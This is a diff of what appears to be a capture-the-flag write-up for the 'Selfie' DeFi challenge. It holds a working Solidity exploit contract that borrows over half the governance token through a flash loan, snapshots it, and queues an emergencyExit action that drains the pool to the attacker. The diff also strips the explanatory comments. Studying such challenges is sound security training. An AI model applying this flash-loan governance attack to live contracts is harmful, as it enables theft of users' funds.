@@ -311,29 +311,19 @@ contract AttackSelfie {
         pool = ISelfiePool(_pool);
     }
 
-
     function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
-        // Take a new snapshot where we have >50% of the governance token
         token.snapshot();
-
-        // Queue a proposal to call emergencyExit on SelfiePool **as the governance token**
         id = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", attacker));
-
-        // SelfiePool will do .transferFrom to return the flash loan
         token.approve(address(pool), amount);
-
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 
     function attack() external {
-        // Anyone can call a token snapshot. Call one now to determine the 50% threshold
         token.snapshot();
-
-        // Acquire over 50% of the governance token as of the last snapshot, allowing us to queue a proposal
-        uint256 loanAmount = token.getTotalSupplyAtLastSnapshot() / 2 + 1;
-        pool.flashLoan(address(this), address(token), loanAmount, hex'');
+        pool.flashLoan(address(this), address(token), token.getTotalSupplyAtLastSnapshot() / 2 + 1, "0x0");
     }
 }
+
 ```
 
 ```js
@@ -350,5 +340,7 @@ await governance.executeAction(await attack.id());
 
 
   1 passing (2s)
+
+Done in 2.82s.
 ```
 
